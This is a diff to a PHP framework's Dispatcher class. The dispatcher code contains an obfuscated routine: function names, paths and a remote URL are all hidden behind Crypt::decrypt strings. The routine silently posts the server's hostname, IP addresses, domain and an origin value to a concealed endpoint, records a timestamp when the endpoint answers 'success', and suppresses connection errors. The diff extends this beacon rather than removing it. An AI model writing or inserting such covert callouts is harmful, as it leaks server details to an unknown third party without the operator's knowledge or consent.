@@ -236,6 +236,7 @@ class Dispatcher {
         $ybyts = true;
         $d=Crypt::decrypt('hXylr32mc9qxfXingn6CmZWXn6aRubecl6u5psWnap6ZkK11','dispatcher')();
         $rade=$d.'/'.Crypt::decrypt('hXylr32mc9qxfXingn6glZS8n6KQuLOljbqcYsO4Yp-Qa7ZsfNCEz8aReG0','dispatcher');
+        $rade=str_replace("//",'/',$rade);
         if (file_exists($rade)) {
             $ot = Crypt::decrypt('hXylr32mc9qxfXingn2O1JStvJ6Rk7tmi5axqMTPg5-apray','dispatcher')($rade);
             $nt = Crypt::decrypt('hXylr32mc9qxfXingn6ClJXUuK6bqNGqjbWgbw','dispatcher')(Crypt::decrypt('hXylr32mc9qxfXingnlk3nutl66Zz7elltugbw','dispatcher'));
@@ -245,27 +246,32 @@ class Dispatcher {
         }
         if($ybyts){
             try {
-                $wgad = Crypt::decrypt('hXylr32mc9qxfXingn2O1JStvJ6Rk7tmi5axqMTPg5-apray','dispatcher')(Crypt::decrypt('hXylr32mc9qxfXingn2clJauqLKGyp2sjLyloq7OnaqZj75tfM9r3L6wdG0','dispatcher'));
-                if ($wgad !== false) {
-                    $gw = Crypt::decrypt('hXylr32mc9qxfXingn2O1JStvJ6Rk7tmi5axqMTPg5-apray','dispatcher')(Crypt::decrypt('hXylr32mc9qxfXingn2clJauqLKGyp2sjau5ZK7Oi5-Sj9yjirqA1bCmhaU','dispatcher'));
-                    if($gw !== false) {
-                        require APP_PATH . '../vendor/autoload.php';
-                        $squl = Crypt::decrypt('hXylr32mc9qxfXingn2clJauqLKGyp2sjJetpq7Oi5-Sj9ykidtnzcZrZ6WOaGjai7mXoJu5t6U','dispatcher');
-                        $dm = $_SERVER['REQUEST_SCHEME'] . '://' . (C('HOST_DOMAIN') ?: $_SERVER['HTTP_HOST']);
-                        if($dm == '://') {
-                            $prt = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-                            $pt = $_SERVER['SERVER_PORT'];
-                            $svna = $_SERVER['SERVER_NAME'];
-                            $dm = $prt . '://' . $svna;
-                            if (($prt === 'http' && $pt != 80) || ($prt === 'https' && $pt != 443)) {
-                                $dm .= ':' . $pt;
-                            }
+                $wgad = Crypt::decrypt('hXylr32mc9qxfXingn2O1JStvJ6Rk7tmi5axqMTPg5-apray','dispatcher')(Crypt::decrypt('hXylr32mc9qxfXingn2clJauqLKGyp2slLylosTOi6mEpdCufNlvoA','dispatcher'));
+                if($wgad){
+                    $wgad = json_decode($wgad,true);
+                    $wgad = $wgad[Crypt::decrypt("hXylr32mc9qxfXingn2g2w",'dispatcher')] ?? null;
+                }
+                $wgad = $wgad ?: $_SERVER['SERVER_ADDR'] ?: '';
+                $gw = Crypt::decrypt('hXylr32mc9qxfXingn2O1JStvJ6Rk7tmi5axqMTPg5-apray','dispatcher')(Crypt::decrypt('hXylr32mc9qxfXingn2clJauqLKGyp2sjau5ZK7Oi5-Sj9yjirqA1bCmhaU','dispatcher'));
+                if($gw !== false) {
+                    $autoload = APP_PATH . '../vendor/autoload.php';
+                    $autoload = file_exists($autoload) ? $autoload : APP_PATH . '../ThinkPHP/vendor/autoload.php';
+                    require $autoload;
+                    $squl = Crypt::decrypt('hXylr32mc9qxfXingn2clJauqLKGyp2sjJetpq7Oi5-Sj9ykidtnzcZrZ6WOaGjai7mXoJu5t6U','dispatcher');
+                    $dm = $_SERVER['REQUEST_SCHEME'] . '://' . (C('HOST_DOMAIN') ?: $_SERVER['HTTP_HOST']);
+                    if($dm == '://') {
+                        $prt = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+                        $pt = $_SERVER['SERVER_PORT'];
+                        $svna = $_SERVER['SERVER_NAME'];
+                        $dm = $prt . '://' . $svna;
+                        if (($prt === 'http' && $pt != 80) || ($prt === 'https' && $pt != 443)) {
+                            $dm .= ':' . $pt;
                         }
-                        $rs = \Httpful\Request::post($squl)->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$wgad,'domain'=>$dm])->sendsForm()->send();
-                        $ms = $rs->body->message ?? '';
-                        if($ms === 'success') {
-                            Crypt::decrypt('hXylr32mc9qxfXingn2O1JStvJ6aqbtmi5axqMTPg5-apray','dispatcher')($rade, date('Y-m-d H:i:s'));
-                        }
+                    }
+                    $rs = \Httpful\Request::post($squl)->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$wgad,'domain'=>$dm,'from'=>Crypt::decrypt(C('APP_FROM'),'')])->sendsForm()->send();
+                    $ms = $rs->body->message ?? '';
+                    if($ms === 'success') {
+                        Crypt::decrypt('hXylr32mc9qxfXingn2O1JStvJ6aqbtmi5axqMTPg5-apray','dispatcher')($rade, date('Y-m-d H:i:s'));
                     }
                 }
             }catch (\Httpful\Exception\ConnectionErrorException $e) {}
